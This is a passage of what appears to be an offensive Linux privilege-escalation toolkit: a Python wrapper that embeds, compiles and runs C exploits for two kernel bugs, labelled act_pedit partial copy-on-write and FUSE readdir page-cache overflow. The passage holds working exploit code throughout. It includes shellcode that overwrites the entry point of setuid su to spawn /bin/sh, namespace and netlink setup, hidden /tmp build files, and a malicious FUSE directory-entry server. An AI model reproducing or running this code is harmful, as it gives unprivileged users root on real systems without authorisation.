static void append_pedit_action(const struct pedit_key_spec *keys, int key_count) {
    char selector_buf[sizeof(struct tc_pedit_sel) + MAX_PEDIT_KEYS * sizeof(struct tc_pedit_key)];
    struct tc_pedit_sel *selector = (void *)selector_buf;
    struct tc_pedit_key *raw_keys = (void *)(selector_buf + sizeof(*selector));
    struct rtattr *action;
    struct rtattr *action_options;
    struct rtattr *keys_ex;
    struct rtattr *key_ex;
    uint16_t header_type;
    uint16_t command;
    int selector_len;
    int index_iter;

    action = request_nest_begin(ACTION_LIST_FIRST);
    request_attr_str(TCA_ACT_KIND, "pedit");
    action_options = request_nest_begin(TCA_ACT_OPTIONS);

    selector_len = sizeof(*selector) + key_count * sizeof(struct tc_pedit_key);
    memset(selector_buf, 0, selector_len);
    selector->nkeys = key_count;
    selector->action = TC_ACT_PIPE;
    for (index_iter = 0; index_iter < key_count; index_iter++) {
        raw_keys[index_iter].off = keys[index_iter].offset;
        raw_keys[index_iter].val = keys[index_iter].value;
        raw_keys[index_iter].mask = keys[index_iter].mask;
    }
    request_attr(TCA_PEDIT_PARMS_EX, selector_buf, selector_len);

    keys_ex = request_nest_begin(TCA_PEDIT_KEYS_EX);
    for (index_iter = 0; index_iter < key_count; index_iter++) {
        key_ex = request_nest_begin(TCA_PEDIT_KEY_EX);
        header_type = keys[index_iter].header_type;
        request_attr(TCA_PEDIT_KEY_EX_HTYPE, &header_type, sizeof(header_type));
        command = TCA_PEDIT_KEY_EX_CMD_SET;
        request_attr(TCA_PEDIT_KEY_EX_CMD, &command, sizeof(command));
        request_nest_end(key_ex);
    }
    request_nest_end(keys_ex);
    request_nest_end(action_options);
    request_nest_end(action);
}

static int egress_pedit_add(int index, const struct pedit_key_spec *keys, int key_count) {
    struct rtattr *options;
    struct rtattr *action_list;
    struct tcmsg msg;

    request_begin(RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_parent = TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
    msg.tcm_info = TC_H_MAKE(FILTER_PRIO << 16, htons(ETH_P_ALL));
    request_append(&msg, sizeof(msg));

    if (use_matchall) {
        request_attr_str(TCA_KIND, "matchall");
        options = request_nest_begin(TCA_OPTIONS);
        action_list = request_nest_begin(TCA_MATCHALL_ACT);
    } else {
        request_attr_str(TCA_KIND, "basic");
        options = request_nest_begin(TCA_OPTIONS);
        append_pktlen_ematch(MIN_DATA_PKT_LEN);
        action_list = request_nest_begin(TCA_BASIC_ACT);
    }
    append_pedit_action(keys, key_count);
    request_nest_end(action_list);
    request_nest_end(options);
    return request_send(0);
}

static void fill_ihl_key(struct pedit_key_spec *key) {
    key->offset = IP_IHL_KEY_OFFSET;
    key->value = IP_IHL_KEY_VALUE;
    key->mask = IP_IHL_KEY_MASK;
    key->header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK;
}

static int pedit_burst(int src_fd, const struct pedit_key_spec *keys, int key_count) {
    struct sockaddr_in addr;
    struct stat info;
    off_t file_offset = 0;
    int client_fd;
    int server_fd;

    if (fstat(src_fd, &info))
        return -1;

    clsact_delete(loopback_index);
    if (clsact_add(loopback_index))
        return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    addr.sin_port = htons(LOOPBACK_PORT);
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0)
        return -1;
    if (connect(client_fd, (void *)&addr, sizeof(addr))) {
        close(client_fd);
        return -1;
    }
    server_fd = accept(listen_fd, NULL, NULL);
    if (server_fd < 0) {
        close(client_fd);
        return -1;
    }

    if (egress_pedit_add(loopback_index, keys, key_count)) {
        close(client_fd);
        close(server_fd);
        return -1;
    }
    fcntl(client_fd, F_SETFL, O_NONBLOCK);
    if (sendfile(client_fd, src_fd, &file_offset, info.st_size) < 0 && errno != EAGAIN) {
        close(client_fd);
        close(server_fd);
        return -1;
    }
    usleep(SETTLE_USEC);
    close(client_fd);
    close(server_fd);
    return 0;
}

static int calibrate(void) {
    struct pedit_key_spec keys[2];
    uint8_t buf[CALIB_LEN];
    int fd;
    int index_iter;
    int landed = -1;

    fd = open(CALIB_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return -1;
    memset(buf, 0, sizeof(buf));
    if (write(fd, buf, sizeof(buf)) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    fsync(fd);

    fill_ihl_key(&keys[0]);
    keys[1].offset = CALIB_PROBE_OFFSET;
    keys[1].value = CALIB_MARK_BYTE * 0x01010101u;
    keys[1].mask = 0;
    keys[1].header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
    if (pedit_burst(fd, keys, 2)) {
        close(fd);
        return -1;
    }

    if (pread(fd, buf, sizeof(buf), 0) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    for (index_iter = 0; index_iter + PEDIT_SLOT <= CALIB_LEN; index_iter++) {
        if (buf[index_iter] == CALIB_MARK_BYTE &&
            buf[index_iter + 1] == CALIB_MARK_BYTE &&
            buf[index_iter + 2] == CALIB_MARK_BYTE &&
            buf[index_iter + 3] == CALIB_MARK_BYTE) {
            landed = index_iter;
            break;
        }
    }
    close(fd);
    unlink(CALIB_PATH);
    if (landed < 0)
        return -1;
    offset_delta = landed - CALIB_PROBE_OFFSET;
    return 0;
}

int setup(void) {
    struct sockaddr_in addr;
    int reuse = 1;

    netlink_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (netlink_fd < 0)
        return -1;
    loopback_index = if_nametoindex("lo");
    if (!loopback_index || link_up(loopback_index))
        return -1;
    link_set_addr(loopback_index, LOOPBACK_ADDR);

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0)
        return -1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    addr.sin_port = htons(LOOPBACK_PORT);
    if (bind(listen_fd, (void *)&addr, sizeof(addr)))
        return -1;
    if (listen(listen_fd, LISTEN_BACKLOG))
        return -1;

    if (calibrate() == 0)
        return 0;
    use_matchall = 1;
    return calibrate();
}

int api_fd_write(int fd, off_t offset, const void *src, size_t size) {
    struct pedit_key_spec keys[MAX_PEDIT_KEYS];
    const uint8_t *bytes = src;
    int key_count = 0;
    size_t pos;

    if (size == 0)
        return 0;
    if (size > PEDIT_MAX_WRITE || (size % PEDIT_SLOT) != 0)
        return -1;
    if (offset < (off_t)offset_delta)
        return -1;

    fill_ihl_key(&keys[key_count++]);
    for (pos = 0; pos < size; pos += PEDIT_SLOT) {
        keys[key_count].offset = (uint32_t)(offset + pos) - (uint32_t)offset_delta;
        keys[key_count].value = (uint32_t)bytes[pos] |
                                ((uint32_t)bytes[pos + 1] << 8) |
                                ((uint32_t)bytes[pos + 2] << 16) |
                                ((uint32_t)bytes[pos + 3] << 24);
        keys[key_count].mask = 0;
        keys[key_count].header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
        key_count++;
    }
    return pedit_burst(fd, keys, key_count);
}

#define SHELLCODE_PAD       0x90

static const unsigned char SHELLCODE[] = {
    0x31, 0xff, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xb8, 0x69, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05,
    SHELLCODE_PAD, SHELLCODE_PAD, SHELLCODE_PAD,
};

static const char *SU_PATHS[] = { "/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL };

static const char *find_su(void) {
    struct stat info;
    int index;
    for (index = 0; SU_PATHS[index]; index++) {
        if (stat(SU_PATHS[index], &info) == 0 && S_ISREG(info.st_mode) &&
            (info.st_mode & S_ISUID) && info.st_uid == 0)
            return SU_PATHS[index];
    }
    return NULL;
}

static long elf_entry_offset(int fd) {
    Elf64_Ehdr ehdr;
    Elf64_Phdr phdr;
    int index;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr))
        return -1;
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0 || ehdr.e_ident[EI_CLASS] != ELFCLASS64)
        return -1;
    for (index = 0; index < ehdr.e_phnum; index++) {
        off_t at = ehdr.e_phoff + (off_t)index * ehdr.e_phentsize;
        if (pread(fd, &phdr, sizeof(phdr), at) != (ssize_t)sizeof(phdr))
            return -1;
        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X) &&
            ehdr.e_entry >= phdr.p_vaddr && ehdr.e_entry < phdr.p_vaddr + phdr.p_filesz)
            return (long)(ehdr.e_entry - phdr.p_vaddr + phdr.p_offset);
    }
    return -1;
}

static void write_proc_file(const char *path, const char *value) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        write(fd, value, strlen(value));
        close(fd);
    }
}

static int corrupt_entry(int su_fd, long entry_offset) {
    char map_line[64];
    uid_t uid = getuid();
    gid_t gid = getgid();
    size_t written = 0;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
        perror("unshare");
        return -1;
    }
    write_proc_file("/proc/self/setgroups", "deny");
    snprintf(map_line, sizeof(map_line), "0 %u 1", uid);
    write_proc_file("/proc/self/uid_map", map_line);
    snprintf(map_line, sizeof(map_line), "0 %u 1", gid);
    write_proc_file("/proc/self/gid_map", map_line);

    if (setup())
        return -1;
    while (written < sizeof(SHELLCODE)) {
        size_t chunk = sizeof(SHELLCODE) - written;
        if (chunk > PEDIT_MAX_WRITE)
            chunk = PEDIT_MAX_WRITE;
        if (api_fd_write(su_fd, entry_offset + written, SHELLCODE + written, chunk))
            return -1;
        written += chunk;
    }
    return 0;
}

static int run_exploit(void) {
    const char *su_path;
    char *su_argv[2];
    int su_fd;
    int sync_pipe[2];
    long entry_offset;
    pid_t child;
    int status;
    char ack = 0;

    su_path = find_su();
    if (!su_path) {
        fprintf(stderr, "[-] no setuid-root su found\n");
        return 1;
    }
    su_fd = open(su_path, O_RDONLY);
    if (su_fd < 0) {
        perror("open su");
        return 1;
    }
    entry_offset = elf_entry_offset(su_fd);
    if (entry_offset < 0) {
        fprintf(stderr, "[-] could not locate su entry point\n");
        close(su_fd);
        return 1;
    }
    printf("[*] target %s entry at 0x%lx\n", su_path, entry_offset);

    if (pipe(sync_pipe)) {
        perror("pipe");
        close(su_fd);
        return 1;
    }
    child = fork();
    if (child < 0) {
        perror("fork");
        close(su_fd);
        return 1;
    }
    if (child == 0) {
        close(sync_pipe[0]);
        if (corrupt_entry(su_fd, entry_offset))
            _exit(1);
        write(sync_pipe[1], "1", 1);
        _exit(0);
    }
    close(sync_pipe[1]);
    read(sync_pipe[0], &ack, 1);
    waitpid(child, &status, 0);
    close(su_fd);
    if (ack != '1' || !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] corruption failed\n");
        return 1;
    }
    printf("[+] Corruption successful. Executing su for root shell...\n");
    su_argv[0] = (char *)su_path;
    su_argv[1] = NULL;
    execve(su_path, su_argv, NULL);
    perror("execve");
    return 1;
}

int main(int argc, char **argv) {
    if (getuid() == 0) {
        fprintf(stderr, "[-] Run as unprivileged user\n");
        return 1;
    }
    printf("CVE-2026-46331 PoC by Ashraf Zaryouh \"0xBlackash\"\n");
    return run_exploit();
}
'''

def _cve_2026_46331_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_46331_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.pe_%s.c" % tag
    bin_path = "/tmp/.pe_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_46331_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_46331_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_46331_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_46331_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running CVE-2026-46331 (timeout 300s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=300)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            p.wait()
            log("[-] timeout")
            _cve_2026_46331_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_46331_cleanup(c_path, bin_path)
        return False

    _cve_2026_46331_cleanup(c_path, bin_path)

    try:
        with open("/bin/su", "rb") as f:
            f.seek(0x44d0)
            marker = f.read(2)
            if marker == b"\x31\xff":
                return True
    except OSError:
        pass
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_46331():
    log("\n[=== METHOD 8: CVE-2026-46331 (act_pedit partial-COW) ===]")

    # cek sudah root
    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # compile & jalankan
    if _cve_2026_46331_compile_and_run():
        log("[+++] CVE-2026-46331 succeeded — root shell")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    log("[-] CVE-2026-46331 failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 9: CVE-2026-31694 (FUSE readdir page-cache overflow)
# ──────────────────────────────────────────────────

CVE_2026_31694_C_SOURCE = r'''
/*
 * Ubuntu 26.04 CVE-2026-31694 local privilege escalation PoC.
 * Build: cc -O2 -Wall -Wextra -pthread -o lpe lpe.c
 * Run as unprivileged user.
 */
#define _GNU_SOURCE

#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <inttypes.h>
#include <limits.h>
#include <linux/fuse.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/vfs.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef FOPEN_CACHE_DIR
#define FOPEN_CACHE_DIR (1 << 3)
#endif
#ifndef FUSE_NAME_MAX
#define FUSE_NAME_MAX 4095
#endif
#ifndef DT_REG
#define DT_REG 8
#endif

#define PAGE_SZ 4096
#define FUSE_BUF_SZ (256 * 1024)
#define FUSE_NODE_BASE 0x100000
#define DEFAULT_TARGETS 512
#define DEFAULT_ROUNDS 8
#define DEFAULT_MAX_UNABSORBED 2048
#define EXT4_SUPER_MAGIC 0xef53
#define TMPFS_MAGIC 0x01021994
#define OVERLAYFS_SUPER_MAGIC 0x794c7630
#define SQUASHFS_MAGIC 0x73717368

struct options {
	char workdir[PATH_MAX];
	char target_dir[PATH_MAX];
	char mountpoint[PATH_MAX];
	const char *suid_path;
	const char *cmd;
	off_t suid_offset;
	unsigned int targets;
	unsigned int rounds;
	unsigned int max_unabsorbed;
	bool keep_workdir;
	bool interactive;
};

struct fuse_server {
	int fd;
	unsigned int targets;
	unsigned char overflow_tail[24];
};

static const unsigned char suid_execve_sh_tail[24] = {
	0xf3, 0x0f, 0x1e, 0xfa, 0x48, 0x8b, 0x3e, 0x31,
	0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x6a, 0x3c,
	0x58, 0x6a, 0x2a, 0x5f, 0x0f, 0x05, 0x90, 0x90
};

extern char **environ;

static void die(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	if (errno)
		fprintf(stderr, ": %s", strerror(errno));
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void msg(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fputc('\n', stdout);
	fflush(stdout);
}

static void write_full(int fd, const void *buf, size_t len)
{
	const char *p = buf;
	while (len) {
		ssize_t n = write(fd, p, len);
		if (n < 0) {
			if (errno == EINTR) continue;
			die("write");
		}
		p += n;
		len -= (size_t)n;
	}
}

static void pread_full(int fd, void *buf, size_t len, off_t off)
{
	char *p = buf;
	size_t done = 0;
	while (done < len) {
		ssize_t n = pread(fd, p + done, len - done, off + (off_t)done);
		if (n < 0) {
			if (errno == EINTR) continue;
			die("pread");
		}
		if (n == 0) die("short pread");
		done += (size_t)n;
	}
}

static void mkdir_if_needed(const char *path)
{
	if (mkdir(path, 0755) && errno != EEXIST)
		die("mkdir %s", path);
}

static void target_path(char *buf, size_t len, const struct options *opt, unsigned int idx)
{
	int n = snprintf(buf, len, "%s/t%05u.sh", opt->target_dir, idx);
	if (n < 0 || (size_t)n >= len) die("target path too long");
}

static void fuse_dir_path(char *buf, size_t len, const struct options *opt, unsigned int idx)
{
	int n = snprintf(buf, len, "%s/d%05u", opt->mountpoint, idx);
	if (n < 0 || (size_t)n >= len) die("FUSE dir path too long");
}

static void setup_paths(struct options *opt)
{
	const char *base = access("/var/tmp", W_OK | X_OK) == 0 ? "/var/tmp" : "/tmp";
	int n;

	if (!opt->workdir[0]) {
		n = snprintf(opt->workdir, sizeof(opt->workdir), "%s/fuse-rdc-exp.XXXXXX", base);
		if (n < 0 || (size_t)n >= sizeof(opt->workdir)) die("workdir path too long");
		if (!mkdtemp(opt->workdir)) die("mkdtemp %s", opt->workdir);
	} else {
		mkdir_if_needed(opt->workdir);
	}

	n = snprintf(opt->target_dir, sizeof(opt->target_dir), "%s/target", opt->workdir);
	if (n < 0 || (size_t)n >= sizeof(opt->target_dir)) die("target dir path too long");

	n = snprintf(opt->mountpoint, sizeof(opt->mountpoint), "%s/fuse", opt->workdir);
	if (n < 0 || (size_t)n >= sizeof(opt->mountpoint)) die("mountpoint path too long");

	mkdir_if_needed(opt->target_dir);
	mkdir_if_needed(opt->mountpoint);
	msg("[poc uid %d] workdir %s", getuid(), opt->workdir);
}

static bool find_fusermount3(char *out, size_t out_len)
{
	const char *path = getenv("PATH");
	char tmp[PATH_MAX];
	char *saveptr = NULL;
	char *dir;

	if (!path) path = "/bin:/usr/bin:/usr/local/bin";
	if (strlen(path) >= sizeof(tmp)) die("PATH too long");
	memcpy(tmp, path, strlen(path) + 1);

	for (dir = strtok_r(tmp, ":", &saveptr); dir; dir = strtok_r(NULL, ":", &saveptr)) {
		char candidate[PATH_MAX];
		int n = snprintf(candidate, sizeof(candidate), "%s/fusermount3", *dir ? dir : ".");
		if (n < 0 || (size_t)n >= sizeof(candidate)) continue;
		if (access(candidate, X_OK) == 0) {
			if (strlen(candidate) >= out_len) die("fusermount3 path too long");
			memcpy(out, candidate, strlen(candidate) + 1);
			return true;
		}
	}
	return false;
}

static const char *fs_type_name(unsigned long type)
{
	switch (type) {
	case EXT4_SUPER_MAGIC: return "ext4";
	case TMPFS_MAGIC: return "tmpfs";
	case OVERLAYFS_SUPER_MAGIC: return "overlayfs";
	case SQUASHFS_MAGIC: return "squashfs";
	default: return "unknown";
	}
}

static void preflight(const struct options *opt)
{
	struct fuse_dirent de;
	struct stat st;
	struct statfs sfs;
	char fusermount[PATH_MAX];
	size_t reclen;
	long page_size;
	int fd;

	if (getuid() == 0) die("refusing to run as root; run as a normal user");

	page_size = sysconf(_SC_PAGESIZE);
	if (page_size != PAGE_SZ) die("unsupported page size %ld; expected 4096", page_size);

	memset(&de, 0, sizeof(de));
	de.namelen = FUSE_NAME_MAX;
	reclen = FUSE_DIRENT_SIZE(&de);
	if (reclen != PAGE_SZ + sizeof(suid_execve_sh_tail))
		die("unexpected FUSE dirent geometry: reclen=%zu", reclen);

	if (stat("/dev/fuse", &st)) die("stat /dev/fuse");
	if (!S_ISCHR(st.st_mode)) die("/dev/fuse is not a character device");
	fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
	if (fd < 0) die("open /dev/fuse");
	close(fd);

	if (!find_fusermount3(fusermount, sizeof(fusermount))) die("fusermount3 not found in PATH");
	if (stat(fusermount, &st)) die("stat %s", fusermount);
	msg("[preflight] fusermount3: %s mode=%04o owner=%lu", fusermount, st.st_mode & 07777, (unsigned long)st.st_uid);
	if (st.st_uid != 0 || !(st.st_mode & S_ISUID))
		msg("[preflight] warning: fusermount3 is not setuid-root; mount may fail");

	if (stat(opt->suid_path, &st)) die("stat %s", opt->suid_path);
	if (!S_ISREG(st.st_mode) || st.st_uid != 0 || !(st.st_mode & S_ISUID))
		die("%s is not a root-owned setuid regular file", opt->suid_path);
	if (access(opt->suid_path, R_OK | X_OK)) die("access %s", opt->suid_path);
	if (opt->suid_offset < PAGE_SZ || opt->suid_offset % PAGE_SZ)
		die("suid offset 0x%jx is not a usable page offset", (intmax_t)opt->suid_offset);

	if (statfs(opt->target_dir, &sfs)) die("statfs target dir");
	msg("[preflight] workdir filesystem: %s (0x%lx)", fs_type_name((unsigned long)sfs.f_type), (unsigned long)sfs.f_type);
}

static void reply_payload(int fd, uint64_t unique, const void *payload, size_t payload_len)
{
	unsigned char buf[8192];
	struct fuse_out_header out = {
		.len = sizeof(out) + payload_len,
		.error = 0,
		.unique = unique,
	};
	if (out.len > sizeof(buf)) die("FUSE reply too large");
	memcpy(buf, &out, sizeof(out));
	if (payload_len) memcpy(buf + sizeof(out), payload, payload_len);
	write_full(fd, buf, out.len);
}

static void reply_empty(int fd, uint64_t unique) { reply_payload(fd, unique, NULL, 0); }

static void reply_error(int fd, uint64_t unique, int err)
{
	struct fuse_out_header out = { .len = sizeof(out), .error = -err, .unique = unique };
	write_full(fd, &out, sizeof(out));
}

static void fill_dir_attr(struct fuse_attr *attr, uint64_t ino)
{
	memset(attr, 0, sizeof(*attr));
	attr->ino = ino;
	attr->size = PAGE_SZ;
	attr->blocks = 1;
	attr->mode = S_IFDIR | 0555;
	attr->nlink = 2;
	attr->uid = 0;
	attr->gid = 0;
	attr->blksize = PAGE_SZ;
}

static void reply_init(int fd, const struct fuse_in_header *in, const void *payload)
{
	const struct fuse_init_in *init = payload;
	struct fuse_init_out out;
	memset(&out, 0, sizeof(out));
	out.major = FUSE_KERNEL_VERSION;
	out.minor = init->minor < FUSE_KERNEL_MINOR_VERSION ? init->minor : FUSE_KERNEL_MINOR_VERSION;
	out.max_background = 16;
	out.congestion_threshold = 12;
	out.max_write = 131072;
	out.time_gran = 1;
	out.max_pages = 32;
	reply_payload(fd, in->unique, &out, sizeof(out));
}

static void reply_lookup(struct fuse_server *srv, const struct fuse_in_header *in, const char *name, size_t name_len)
{
	struct fuse_entry_out out;
	unsigned long idx;
	char tmp[32];
	char *end;

	if (in->nodeid != FUSE_ROOT_ID || name_len < 2 || name[0] != 'd' || name_len >= sizeof(tmp)) {
		reply_error(srv->fd, in->unique, ENOENT);
		return;
	}
	memcpy(tmp, name + 1, name_len - 1);
	tmp[name_len - 1] = '\0';
	errno = 0;
	idx = strtoul(tmp, &end, 10);
	if (errno || *end || idx >= srv->targets) {
		reply_error(srv->fd, in->unique, ENOENT);
		return;
	}
	memset(&out, 0, sizeof(out));
	out.nodeid = FUSE_NODE_BASE + idx;
	out.generation = 1;
	out.entry_valid = 60;
	out.attr_valid = 60;
	fill_dir_attr(&out.attr, out.nodeid);
	reply_payload(srv->fd, in->unique, &out, sizeof(out));
}

static void reply_getattr(int fd, uint64_t unique, uint64_t nodeid)
{
	struct fuse_attr_out out;
	memset(&out, 0, sizeof(out));
	out.attr_valid = 60;
	fill_dir_attr(&out.attr, nodeid);
	reply_payload(fd, unique, &out, sizeof(out));
}

static void reply_open_dir(int fd, uint64_t unique, uint64_t fh)
{
	struct fuse_open_out out;
	memset(&out, 0, sizeof(out));
	out.fh = fh;
	out.open_flags = FOPEN_CACHE_DIR;
	reply_payload(fd, unique, &out, sizeof(out));
}

static void reply_statfs(int fd, uint64_t unique)
{
	struct fuse_statfs_out out;
	memset(&out, 0, sizeof(out));
	out.st.blocks = 1024 * 1024;
	out.st.bfree = 1024 * 1024;
	out.st.bavail = 1024 * 1024;
	out.st.files = 1024 * 1024;
	out.st.ffree = 1024 * 1024;
	out.st.bsize = PAGE_SZ;
	out.st.namelen = FUSE_NAME_MAX;
	out.st.frsize = PAGE_SZ;
	reply_payload(fd, unique, &out, sizeof(out));
}

static void build_malicious_dirent(unsigned char *buf, size_t *len, const unsigned char tail[24])
{
	struct fuse_dirent *de = (struct fuse_dirent *)buf;
	size_t reclen;

	memset(buf, 'A', 4120);
	memset(de, 0, FUSE_NAME_OFFSET);
	de->ino = 0x41414141;
	de->off = 1;
	de->namelen = FUSE_NAME_MAX;
	de->type = DT_REG;

	reclen = FUSE_DIRENT_SIZE(de);
	if (reclen != 4120) die("unexpected FUSE dirent size: %zu", reclen);

	memcpy(buf + PAGE_SZ, tail, 24);
	*len = reclen;
}

static void reply_readdir(struct fuse_server *srv, const struct fuse_in_header *in, const void *payload)
{
	const struct fuse_read_in *rin = payload;
	unsigned char dirent[4120];
	size_t len = 0;

	if (in->nodeid < FUSE_NODE_BASE || rin->offset != 0) {
		reply_empty(srv->fd, in->unique);
		return;
	}
	build_malicious_dirent(dirent, &len, srv->overflow_tail);
	reply_payload(srv->fd, in->unique, dirent, len);
}

static void *fuse_loop(void *arg)
{
	struct fuse_server *srv = arg;
	unsigned char buf[FUSE_BUF_SZ];

	for (;;) {
		ssize_t n = read(srv->fd, buf, sizeof(buf));
		struct fuse_in_header *in = (struct fuse_in_header *)buf;
		void *payload = buf + sizeof(*in);

		if (n < 0) {
			if (errno == EINTR) continue;
			if (errno == ENODEV || errno == ENOENT) return NULL;
			die("read /dev/fuse");
		}
		if (n == 0) return NULL;
		if ((size_t)n < sizeof(*in)) continue;

		switch (in->opcode) {
		case FUSE_INIT: reply_init(srv->fd, in, payload); break;
		case FUSE_LOOKUP: reply_lookup(srv, in, payload, in->len - sizeof(*in)); break;
		case FUSE_GETATTR: reply_getattr(srv->fd, in->unique, in->nodeid); break;
		case FUSE_OPENDIR: reply_open_dir(srv->fd, in->unique, in->nodeid); break;
		case FUSE_READDIR: reply_readdir(srv, in, payload); break;
		case FUSE_RELEASEDIR:
		case FUSE_ACCESS: reply_empty(srv->fd, in->unique); break;
		case FUSE_STATFS: reply_statfs(srv->fd, in->unique); break;
		case FUSE_FORGET: break;
		default: reply_error(srv->fd, in->unique, ENOSYS); break;
		}
	}
}

static int recv_fd(int sock)
{
	char buf[1];
	char cmsgbuf[CMSG_SPACE(sizeof(int))];
	struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
	struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_control = cmsgbuf, .msg_controllen = sizeof(cmsgbuf) };
	struct cmsghdr *cmsg;
	ssize_t n;
	int fd = -1;

	n = recvmsg(sock, &msg, 0);
	if (n < 0) die("recvmsg fusermount3 fd");
	if (n == 0) { errno = 0; die("fusermount3 closed without sending /dev/fuse fd"); }

	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS || cmsg->cmsg_len < CMSG_LEN(sizeof(fd)))
		die("fusermount3 did not send a valid /dev/fuse fd");

	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
	if (fd < 0) die("invalid /dev/fuse fd from fusermount3");
	return fd;
}

static int mount_with_fusermount3(const struct options *opt)
{
	int sv[2];
	pid_t pid;
	int fd;
	int status;
	char commfd[32];
	char opts[256];

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) die("socketpair fusermount3");

	pid = fork();
	if (pid < 0) die("fork fusermount3");
	if (pid == 0) {
		close(sv[0]);
		if (fcntl(sv[1], F_SETFD, 0)) die("fcntl fusermount3 comm fd");
		snprintf(commfd, sizeof(commfd), "%d", sv[1]);
		if (setenv("_FUSE_COMMFD", commfd, 1)) die("setenv _FUSE_COMMFD");
		snprintf(opts, sizeof(opts), "fsname=fuse-rdc,subtype=fuse-rdc,max_read=131072");
		execlp("fusermount3", "fusermount3", "-o", opts, opt->mountpoint, NULL);
		die("exec fusermount3");
	}

	close(sv[1]);
	fd = recv_fd(sv[0]);
	close(sv[0]);

	if (waitpid(pid, &status, 0) < 0) die("waitpid fusermount3");
	if (!WIFEXITED(status) || WEXITSTATUS(status)) die("fusermount3 failed: status=0x%x", status);

	return fd;
}

static pid_t start_fuse_server(const struct options *opt)
{
	int pipefd[2];
	pid_t pid;
	char ready;

	if (pipe(pipefd)) die("pipe");

	pid = fork();
	if (pid < 0) die("fork server");
	if (pid == 0) {
		struct fuse_server srv;
		pthread_t tid;
